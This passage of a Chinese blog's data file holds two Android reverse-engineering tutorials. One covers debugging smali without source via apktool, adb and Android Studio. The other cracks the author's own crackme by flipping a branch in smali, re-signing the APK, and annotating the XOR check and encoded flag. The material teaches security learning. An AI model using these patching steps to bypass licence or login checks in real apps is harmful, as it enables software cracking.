ps</code></p>\n<p>找到packName的PID</p>\n<p>这里的PID 是<code>3336</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180811567.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330181315755\"></p>\n<p>最后做一个端口转发</p>\n<p><code>adb forward tcp:5005 jdwp:3336</code></p>\n<p>回到AS中，在入口处下个断点</p>\n<p>然后调试，成功如下图</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181315755.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330181702261\"></p>\n<p>ohhhhhhh :star:</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>无源码调试Smali，很有必要</p>\n<p>JVM：夜神模拟器 V6.6.0.5101</p>\n<p>开发环境：Android Studio 3.6.1</p>\n<p>文中的目标APK命名为：<code>Nothing.apk</code></p>\n<p>Android Killer V1.3.1.0（下面简称AK）</p>\n<p>夜神模拟器或真机</p>\n<p>演示APK：<a href=\"https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/android_series/raw/master/%E4%BE%8B%E5%AD%90/crackme1.apk</a></p>\n<h2 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h2><p><a href=\"https://bitbucket.org/JesusFreke/smali/downloads/\" target=\"_blank\" rel=\"noopener\">https://bitbucket.org/JesusFreke/smali/downloads/</a></p>\n<p><strong>这个包在页面下方</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172401980.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330172401980\"></p>\n<p>安装位置在设置的插件中，如图</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172515100.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330172515100\"></p>\n<h2 id=\"反编译APK\"><a href=\"#反编译APK\" class=\"headerlink\" title=\"反编译APK\"></a>反编译APK</h2><p>一般release版本都是不支持调试的，先解包</p>\n<p><code>apktool d Nothing.apk</code></p>\n<p>修改<code>AndroidManifest.xml</code> 中的调试选项</p>\n<p>在<code>application</code>中添加<code>android:debuggable=&quot;true&quot;</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181158966.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330172920337\"></p>\n<p>修改后回包</p>\n<p><code>apktool b . -o Nothing_path.apk</code></p>\n<p>这里的apk还没有签名，如何签名参考上一篇文章</p>\n<p><a href=\"http://l0yy.gitee.io/cray/2019/12/14/android逆向一/\">http://l0yy.gitee.io/cray/2019/12/14/android%E9%80%86%E5%90%91%E4%B8%80/</a></p>\n<hr>\n<p><strong>后面的操作都是建立在这个<code>Nothing_path.apk</code>上的</strong></p>\n<hr>\n<h2 id=\"安装Nothing-path-apk\"><a href=\"#安装Nothing-path-apk\" class=\"headerlink\" title=\"安装Nothing_path.apk\"></a>安装Nothing_path.apk</h2><p><strong>法1：直接把apk拖进去自动安装</strong></p>\n<p><strong>法2：使用adb</strong></p>\n<p>先链接到模拟器,再安装</p>\n<pre><code class=\"shell\">adb connect 127.0.0.1:62001            //夜神模拟器固定链接端口62001\nadb install Nothing_path.apk</code></pre>\n<p>为了方便后期调试，这里将要调试的程序以调试模式开启，让它等待调试。</p>\n<p>标准格式 </p>\n<p><code>adb shell am start -D -n packagename/packagename.MainActivity</code></p>\n<p>我的命令如下</p>\n<p><code>adb shell am start -D -n com.cray.nothing/com.cray.nothing.MainActivity</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175318198.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330181158966\"></p>\n<h2 id=\"配置调试器-AS\"><a href=\"#配置调试器-AS\" class=\"headerlink\" title=\"配置调试器 AS\"></a>配置调试器 AS</h2><p><strong>打开apktool 解包生成的目录</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330172920337.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330175318198\"></p>\n<p>打开后在AS目录如下 </p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330175900669.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330175900669\"></p>\n<p>接下来每一步都要做</p>\n<ol>\n<li><p>设置源根目录</p>\n<p>右键Smali，选择make Drectory As -&gt; sourses root </p>\n<p>有多少个Smali文件夹就设置多少</p>\n<p>但是也有将整个项目都设为Soourses root（未尝试）</p>\n</li>\n<li><p>设置SDK</p>\n<p>右键项目，open modlue setting 然后选择Project 选择一个本机的SDK</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180417381.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330180417381\"></p>\n</li>\n<li><p>配置调试器选项</p>\n<p>基本配置都好了，配置下调试选项就行</p>\n<p>选择 Run –&gt;Edit Configurations，增加一个Remote调试的调试选项</p>\n<p>注意红色表注的就行，其他默认</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181702261.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330180811567\"></p>\n</li>\n</ol>\n<h3 id=\"连接模拟器调试\"><a href=\"#连接模拟器调试\" class=\"headerlink\" title=\"连接模拟器调试\"></a>连接模拟器调试</h3><p>打开cmd</p>\n<p>查询模拟器中所有的进程</p>\n<p><code>adb shell ps</code></p>\n<p>找到packName的PID</p>\n<p>这里的PID 是<code>3336</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330180811567.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330181315755\"></p>\n<p>最后做一个端口转发</p>\n<p><code>adb forward tcp:5005 jdwp:3336</code></p>\n<p>回到AS中，在入口处下个断点</p>\n<p>然后调试，成功如下图</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200330181315755.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200330181702261\"></p>\n<p>ohhhhhhh :star:</p>\n"},{"title":"Android逆向第一个CrakeMe","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120851.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120851.png","date":"2019-12-14T14:28:01.000Z","_content":"\n\n自己写的第一个Android CrakeMe 也是为了练手\n\n随意输入参数为错误，始入正确flag能打印`Success `\n\n![20191214193723.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193723.png)\n\n配合使用上一篇的流程破解\n\n## 解包\n\n使用`apktool`解包\n\n![20191214193422.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193422.png)\n\n\n拿到了Smali文件\n\n## 反编译\n\n这里使用`jadx`发编译\n\n知道了成功会打印`Success`,直接搜索关键字就好了\n\n![20191214194137.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194137.png)\n\n\n双击进去后就可以看到关键的代码，可以使用引用查看函数调用情况\n\n这里看到的`JAVA`代码是`Smali`反编译得到的，所以中文都是使用的`Unicode`表示,这也表示以后搜索代码中的关键字需要转化为`Unicode`字符集去搜索\n\n![20191214194305.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194305.png)\n\n\n很简单的逻辑就是改跳转，把 `==`改为`!=`这类的相反的比较\n\n我们不能直接修改JAVA代码，要修改JVM虚拟机读的`Smali`语句\n\n这和你要破解windows程序，不能在IDA中直接改F5出来伪代码，要修改汇编一个道理\n\n\n\n我们要修改的代码位置如下\n\n![20191214200228.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200228.png)\n\n找到相应的文件，使用编辑器打开，直接修改Smali语句就好了\n\n![20191214200613.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200613.png)\n\n这里将`if-eqz`修改为`if-nez`\n\n然后保存退出\n\n\n## 回编译APK\n\n这里需要将修改后的文件重新编译为APK，才能安装\n\n使用命令\n\n`apktool b [Folder_Paht]`\n\n![20191214201012.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201012.png)\n\n成功后会在`Folder_Paht/dist`下创建新的打包文件，但是现在不能安装，没有签名文件，需要给这个文件签一个制作者的`sign`\n\n![20191214201139.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201139.png)\n\n具体命令\n\n`jarsigner -verbose -keystore key.keystore D:\\Tools\\ApkTools\\Hello\\dist\\Hello.apk key.keystore`\n\n\n![20191214201718.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201718.png)\n\n\n\n\n放入模拟器，无论输入什么都会输出Success(除了正确密码...)\n\n![20191214201908.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201908.png)\n\n\n\n\n\n以上就是通过修改Smali语句实现的暴力破解\n\n\n下面详细分析一下Smali语句\n\n源码，注意空格在反编译的Smali语句中也算一行\n\n![20191216101748.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216101748.png)\n\n\n```Smali\n.class public Lcom/Crat/changeme/MainActivity;#类名\n.super Landroidx/appcompat/app/AppCompatActivity;#父类\n.source \"MainActivity.java\"#对应的JAVA源代码文件名\n\n\n# direct methods\n.method public constructor <init>()V\n    .locals 0\n\n    .line 11\n    #调用父类的AppCompatActivity初始化函数，已经识别为init\n    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V                    \n\n    #无返回值\n    return-void\n.end method\n\n\n# virtual methods\n.method public Pushed(Landroid/view/View;)V\n    .locals 8\n    .param p1, \"view\"    # Landroid/view/View;\n\n    .line 21\n    # v0 = 0x7f070042\n    const v0, 0x7f070042\n\n    #调用MainActivity.findViewById(int v0)  返回值是 View 类型\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;->findViewById(I)Landroid/view/View;\n\n    #将返回值(对象)赋给v0\n    move-result-object v0\n\n    #强制类型转换，将v0转换为TextView类型\n    check-cast v0, Landroid/widget/TextView;\n\n    .line 22\n    #声明变量 TextView Name  来保存v0寄存器的值\n    .local v0, \"Name\":Landroid/widget/TextView;\n\n    const v1, 0x7f0700ab\n\n    invoke-virtual {p0, v1}, Lcom/Crat/changeme/MainActivity;->findViewById(I)Landroid/view/View;\n\n    move-result-object v1\n\n    check-cast v1, Landroid/widget/TextView;\n\n    .line 23\n    .local v1, \"Text2\":Landroid/widget/TextView;\n    const v2, 0x7f070054\n\n    invoke-virtual {p0, v2}, Lcom/Crat/changeme/MainActivity;->findViewById(I)Landroid/view/View;\n\n    move-result-object v2\n\n    check-cast v2, Landroid/widget/TextView;\n\n    .line 24\n    .local v2, \"Edit2\":Landroid/widget/TextView;\n    #下面一句翻译为java语句是 v2.getText() 函数返回类型为char类型的序列\n    #CharSequence和String 详情请看：https://blog.csdn.net/iblade/article/details/78111223\n    invoke-virtual {v2}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;\n\n    move-result-object v3\n    #给上面的CharSequence转换为String类型\n    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;\n\n    move-result-object v3\n\n    .line 25\n    #将获得的String字符赋值给InputKey局部变量中\n    .local v3, \"InputKey\":Ljava/lang/String;\n    const-string v4, \"\"\n\n    .line 27\n    .local v4, \"TmpFlag\":Ljava/lang/String;\n \n    # 下面两句表示 int i = 0\n    const/4 v5, 0x0\n    .local v5, \"i\":I\n\n    :goto_0\n    #获取到输入字符串的长度\n    invoke-virtual {v3}, Ljava/lang/String;->length()I\n    #将长度返回给v6寄存器保存\n    move-result v6\n\n    #如果v5>=v6 就跳转\n    if-ge v5, v6, :cond_0\n\n    .line 29\n    new-instance v6, Ljava/lang/StringBuilder;\n\n    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V\n\n    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v3, v5}, Ljava/lang/String;->charAt(I)C\n\n    move-result v7\n    #xor-int/lit8 v7, v7, 0xa\tv7(前) = v7(后) ^  0xa\n    xor-int/lit8 v7, v7, 0xa\n\n    int-to-char v7, v7\n\n    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;\n\n    move-result-object v4\n\n    .line 27\n    #add-int/lit8 v5, v5, 0x1  v5(前) = v5(后) + 1\n    add-int/lit8 v5, v5, 0x1\n\n    goto :goto_0\n\n    .line 32\n    .end local v5    # \"i\":I\n\n\n    :cond_0\n    #Sting v5 = \"lfkmqBoffe*}exfnw\"\n    const-string v5, \"lfkmqBoffe*}exfnw\"\n\n    #v4.equals(v5) 返回值是boolean\n    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z\n\n    move-result v5\n\n    #v5不等于0跳转\n    if-nez v5, :cond_1\n\n    .line 34\n    const-string v5, \"\\u606d\\u559c\\u6b63\\u786e\\uff01\"\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    .line 35\n    const-string v5, \"Success!\"\n\n    invoke-virtual {v1, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    goto :goto_1\n\n    .line 39\n    :cond_1\n    const-string v5, \"\\u9519\\u8bef\\uff0c\\u8bf7\\u91cd\\u8bd5\\uff01\"\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    .line 40\n    invoke-virtual {v1, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    .line 42\n    :goto_1\n    return-void\n.end method\n\n.method protected onCreate(Landroid/os/Bundle;)V\n    .locals 1\n    .param p1, \"savedInstanceState\"    # Landroid/os/Bundle;\n\n    .line 15\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V\n\n    .line 16\n    #这里给到的是资源布局文件的编号，去找到这个值对应的资源文件就行\n    const v0, 0x7f0a001c\n    #setContentView(R.layout.activity_main);\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;->setContentView(I)V\n\n    .line 17\n    return-void\n.end method\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Android第一个CrakeMe.md","raw":"---\ntitle: Android逆向第一个CrakeMe\ntags: [Android逆向]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120851.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120851.png\ndate: 2019-12-14 22:28:01\n---\n\n\n自己写的第一个Android CrakeMe 也是为了练手\n\n随意输入参数为错误，始入正确flag能打印`Success `\n\n![20191214193723.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193723.png)\n\n配合使用上一篇的流程破解\n\n## 解包\n\n使用`apktool`解包\n\n![20191214193422.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193422.png)\n\n\n拿到了Smali文件\n\n## 反编译\n\n这里使用`jadx`发编译\n\n知道了成功会打印`Success`,直接搜索关键字就好了\n\n![20191214194137.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194137.png)\n\n\n双击进去后就可以看到关键的代码，可以使用引用查看函数调用情况\n\n这里看到的`JAVA`代码是`Smali`反编译得到的，所以中文都是使用的`Unicode`表示,这也表示以后搜索代码中的关键字需要转化为`Unicode`字符集去搜索\n\n![20191214194305.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194305.png)\n\n\n很简单的逻辑就是改跳转，把 `==`改为`!=`这类的相反的比较\n\n我们不能直接修改JAVA代码，要修改JVM虚拟机读的`Smali`语句\n\n这和你要破解windows程序，不能在IDA中直接改F5出来伪代码，要修改汇编一个道理\n\n\n\n我们要修改的代码位置如下\n\n![20191214200228.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200228.png)\n\n找到相应的文件，使用编辑器打开，直接修改Smali语句就好了\n\n![20191214200613.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200613.png)\n\n这里将`if-eqz`修改为`if-nez`\n\n然后保存退出\n\n\n## 回编译APK\n\n这里需要将修改后的文件重新编译为APK，才能安装\n\n使用命令\n\n`apktool b [Folder_Paht]`\n\n![20191214201012.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201012.png)\n\n成功后会在`Folder_Paht/dist`下创建新的打包文件，但是现在不能安装，没有签名文件，需要给这个文件签一个制作者的`sign`\n\n![20191214201139.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201139.png)\n\n具体命令\n\n`jarsigner -verbose -keystore key.keystore D:\\Tools\\ApkTools\\Hello\\dist\\Hello.apk key.keystore`\n\n\n![20191214201718.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201718.png)\n\n\n\n\n放入模拟器，无论输入什么都会输出Success(除了正确密码...)\n\n![20191214201908.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201908.png)\n\n\n\n\n\n以上就是通过修改Smali语句实现的暴力破解\n\n\n下面详细分析一下Smali语句\n\n源码，注意空格在反编译的Smali语句中也算一行\n\n![20191216101748.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216101748.png)\n\n\n```Smali\n.class public Lcom/Crat/changeme/MainActivity;#类名\n.super Landroidx/appcompat/app/AppCompatActivity;#父类\n.source \"MainActivity.java\"#对应的JAVA源代码文件名\n\n\n# direct methods\n.method public constructor <init>()V\n    .locals 0\n\n    .line 11\n    #调用父类的AppCompatActivity初始化函数，已经识别为init\n    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V                    \n\n    #无返回值\n    return-void\n.end method\n\n\n# virtual methods\n.method public Pushed(Landroid/view/View;)V\n    .locals 8\n    .param p1, \"view\"    # Landroid/view/View;\n\n    .line 21\n    # v0 = 0x7f070042\n    const v0, 0x7f070042\n\n    #调用MainActivity.findViewById(int v0)  返回值是 View 类型\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;->findViewById(I)Landroid/view/View;\n\n    #将返回值(对象)赋给v0\n    move-result-object v0\n\n    #强制类型转换，将v0转换为TextView类型\n    check-cast v0, Landroid/widget/TextView;\n\n    .line 22\n    #声明变量 TextView Name  来保存v0寄存器的值\n    .local v0, \"Name\":Landroid/widget/TextView;\n\n    const v1, 0x7f0700ab\n\n    invoke-virtual {p0, v1}, Lcom/Crat/changeme/MainActivity;->findViewById(I)Landroid/view/View;\n\n    move-result-object v1\n\n    check-cast v1, Landroid/widget/TextView;\n\n    .line 23\n    .local v1, \"Text2\":Landroid/widget/TextView;\n    const v2, 0x7f070054\n\n    invoke-virtual {p0, v2}, Lcom/Crat/changeme/MainActivity;->findViewById(I)Landroid/view/View;\n\n    move-result-object v2\n\n    check-cast v2, Landroid/widget/TextView;\n\n    .line 24\n    .local v2, \"Edit2\":Landroid/widget/TextView;\n    #下面一句翻译为java语句是 v2.getText() 函数返回类型为char类型的序列\n    #CharSequence和String 详情请看：https://blog.csdn.net/iblade/article/details/78111223\n    invoke-virtual {v2}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;\n\n    move-result-object v3\n    #给上面的CharSequence转换为String类型\n    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;\n\n    move-result-object v3\n\n    .line 25\n    #将获得的String字符赋值给InputKey局部变量中\n    .local v3, \"InputKey\":Ljava/lang/String;\n    const-string v4, \"\"\n\n    .line 27\n    .local v4, \"TmpFlag\":Ljava/lang/String;\n \n    # 下面两句表示 int i = 0\n    const/4 v5, 0x0\n    .local v5, \"i\":I\n\n    :goto_0\n    #获取到输入字符串的长度\n    invoke-virtual {v3}, Ljava/lang/String;->length()I\n    #将长度返回给v6寄存器保存\n    move-result v6\n\n    #如果v5>=v6 就跳转\n    if-ge v5, v6, :cond_0\n\n    .line 29\n    new-instance v6, Ljava/lang/StringBuilder;\n\n    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V\n\n    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v3, v5}, Ljava/lang/String;->charAt(I)C\n\n    move-result v7\n    #xor-int/lit8 v7, v7, 0xa\tv7(前) = v7(后) ^  0xa\n    xor-int/lit8 v7, v7, 0xa\n\n    int-to-char v7, v7\n\n    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;\n\n    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;\n\n    move-result-object v4\n\n    .line 27\n    #add-int/lit8 v5, v5, 0x1  v5(前) = v5(后) + 1\n    add-int/lit8 v5, v5, 0x1\n\n    goto :goto_0\n\n    .line 32\n    .end local v5    # \"i\":I\n\n\n    :cond_0\n    #Sting v5 = \"lfkmqBoffe*}exfnw\"\n    const-string v5, \"lfkmqBoffe*}exfnw\"\n\n    #v4.equals(v5) 返回值是boolean\n    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z\n\n    move-result v5\n\n    #v5不等于0跳转\n    if-nez v5, :cond_1\n\n    .line 34\n    const-string v5, \"\\u606d\\u559c\\u6b63\\u786e\\uff01\"\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    .line 35\n    const-string v5, \"Success!\"\n\n    invoke-virtual {v1, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    goto :goto_1\n\n    .line 39\n    :cond_1\n    const-string v5, \"\\u9519\\u8bef\\uff0c\\u8bf7\\u91cd\\u8bd5\\uff01\"\n\n    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    .line 40\n    invoke-virtual {v1, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n\n    .line 42\n    :goto_1\n    return-void\n.end method\n\n.method protected onCreate(Landroid/os/Bundle;)V\n    .locals 1\n    .param p1, \"savedInstanceState\"    # Landroid/os/Bundle;\n\n    .line 15\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V\n\n    .line 16\n    #这里给到的是资源布局文件的编号，去找到这个值对应的资源文件就行\n    const v0, 0x7f0a001c\n    #setContentView(R.layout.activity_main);\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;->setContentView(I)V\n\n    .line 17\n    return-void\n.end method\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Android第一个CrakeMe","published":1,"updated":"2019-12-16T04:09:22.782Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw61e0003ccuq6bk6srcd","content":"<p>自己写的第一个Android CrakeMe 也是为了练手</p>\n<p>随意输入参数为错误，始入正确flag能打印<code>Success</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193723.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214193723.png\"></p>\n<p>配合使用上一篇的流程破解</p>\n<h2 id=\"解包\"><a href=\"#解包\" class=\"headerlink\" title=\"解包\"></a>解包</h2><p>使用<code>apktool</code>解包</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193422.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214193422.png\"></p>\n<p>拿到了Smali文件</p>\n<h2 id=\"反编译\"><a href=\"#反编译\" class=\"headerlink\" title=\"反编译\"></a>反编译</h2><p>这里使用<code>jadx</code>发编译</p>\n<p>知道了成功会打印<code>Success</code>,直接搜索关键字就好了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194137.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214194137.png\"></p>\n<p>双击进去后就可以看到关键的代码，可以使用引用查看函数调用情况</p>\n<p>这里看到的<code>JAVA</code>代码是<code>Smali</code>反编译得到的，所以中文都是使用的<code>Unicode</code>表示,这也表示以后搜索代码中的关键字需要转化为<code>Unicode</code>字符集去搜索</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194305.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214194305.png\"></p>\n<p>很简单的逻辑就是改跳转，把 <code>==</code>改为<code>!=</code>这类的相反的比较</p>\n<p>我们不能直接修改JAVA代码，要修改JVM虚拟机读的<code>Smali</code>语句</p>\n<p>这和你要破解windows程序，不能在IDA中直接改F5出来伪代码，要修改汇编一个道理</p>\n<p>我们要修改的代码位置如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200228.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214200228.png\"></p>\n<p>找到相应的文件，使用编辑器打开，直接修改Smali语句就好了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200613.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214200613.png\"></p>\n<p>这里将<code>if-eqz</code>修改为<code>if-nez</code></p>\n<p>然后保存退出</p>\n<h2 id=\"回编译APK\"><a href=\"#回编译APK\" class=\"headerlink\" title=\"回编译APK\"></a>回编译APK</h2><p>这里需要将修改后的文件重新编译为APK，才能安装</p>\n<p>使用命令</p>\n<p><code>apktool b [Folder_Paht]</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201012.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201012.png\"></p>\n<p>成功后会在<code>Folder_Paht/dist</code>下创建新的打包文件，但是现在不能安装，没有签名文件，需要给这个文件签一个制作者的<code>sign</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201139.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201139.png\"></p>\n<p>具体命令</p>\n<p><code>jarsigner -verbose -keystore key.keystore D:\\Tools\\ApkTools\\Hello\\dist\\Hello.apk key.keystore</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201718.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201718.png\"></p>\n<p>放入模拟器，无论输入什么都会输出Success(除了正确密码…)</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201908.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214201908.png\"></p>\n<p>以上就是通过修改Smali语句实现的暴力破解</p>\n<p>下面详细分析一下Smali语句</p>\n<p>源码，注意空格在反编译的Smali语句中也算一行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216101748.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216101748.png\"></p>\n<pre><code class=\"Smali\">.class public Lcom/Crat/changeme/MainActivity;#类名\n.super Landroidx/appcompat/app/AppCompatActivity;#父类\n.source &quot;MainActivity.java&quot;#对应的JAVA源代码文件名\n\n\n# direct methods\n.method public constructor &lt;init&gt;()V\n    .locals 0\n\n    .line 11\n    #调用父类的AppCompatActivity初始化函数，已经识别为init\n    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-&gt;&lt;init&gt;()V                    \n\n    #无返回值\n    return-void\n.end method\n\n\n# virtual methods\n.method public Pushed(Landroid/view/View;)V\n    .locals 8\n    .param p1, &quot;view&quot;    # Landroid/view/View;\n\n    .line 21\n    # v0 = 0x7f070042\n    const v0, 0x7f070042\n\n    #调用MainActivity.findViewById(int v0)  返回值是 View 类型\n    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;\n\n    #将返回值(对象)赋给v0\n    move-result-object v0\n\n    #强制类型转换，将v0转换为TextView类型\n    check-cast v0, Landroid/widget/TextView;\n\n    .line 22\n    #声明变量 TextView Name  来保存v0寄存器的值\n    .local v0, &quot;Name&quot;:Landroid/widget/TextView;\n\n    const v1, 0x7f0700ab\n\n    invoke-virtual {p0, v1}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;\n\n    move-result-object v1\n\n    check-cast v1, Landroid/widget/TextView;\n\n    .line 23\n    .local v1, &quot;Text2&quot;:Landroid/widget/TextView;\n    const v2, 0x7f070054\n\n    invoke-virtual {p0, v2}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;\n\n    move-result-object v2\n\n    check-cast v2, Landroid/widget/TextView;\n\n    .line 24\n    .local v2, &quot;Edit2&quot;:Landroid/widget/TextView;\n    #下面一句翻译为java语句是 v2.getText() 函数返回类型为char类型的序列\n    #CharSequence和String 详情请看：https://blog.csdn.net/iblade/article/details/78111223\n    invoke-virtual {v2}, Landroid/widget/TextView;-&gt;getText()Ljava/lang/CharSequence;\n\n    move-result-object v3\n    #给上面的CharSequence转换为String类型\n    invoke-interface {v3}, Ljava/lang/CharSequence;-&gt;toString()Ljava/lang/String;\n\n    move-result-object v3\n\n    .line 25\n    